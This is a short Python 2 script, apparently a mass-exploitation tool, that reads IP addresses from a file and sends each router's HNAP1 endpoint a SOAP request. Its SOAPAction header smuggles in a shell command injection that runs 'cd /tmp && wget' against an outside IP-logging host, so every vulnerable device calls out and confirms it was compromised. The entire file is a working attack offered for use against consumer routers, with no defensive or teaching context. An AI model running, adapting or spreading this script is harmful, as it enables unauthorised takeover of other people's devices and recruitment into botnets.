#! python !#

# HNAP Exploit | by; LiGhT

import threading, sys, time, random, socket, re, os, requests

ips = open(sys.argv[1], "r").readlines()
payload = "<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><AddPortMapping xmlns=\"http://purenetworks.com/HNAP1/\"><PortMappingDescription>foobar</PortMappingDescription><InternalClient>192.168.0.100</InternalClient><PortMappingProtocol>TCP</PortMappingProtocol><ExternalPort>1234</ExternalPort><InternalPort>1234</InternalPort></AddPortMapping></soap:Body></soap:Envelope>"
headerlist = {'SOAPAction': 'http://purenetworks.com/HNAP1/GetDeviceSettings/`cd /tmp && wget http://iplogger.co/2qWq45 -O-`'}

class pump(threading.Thread):
	def __init__ (self, ip):
		threading.Thread.__init__(self)
		self.ip = str(ip).rstrip('\n')
	def run(self):
		try:
			url = "http://"+ip+"/HNAP1"
			url = re.sub('\n', '', url)
			r = requests.post(url, timeout=5, headers=headerlist, data=payload)
			print "[HNAP] Payload Sent %s"%(url)
		except:
			pass

for ip in ips:
	try:
		n = pump(ip)
		n.start()
	except:
		pass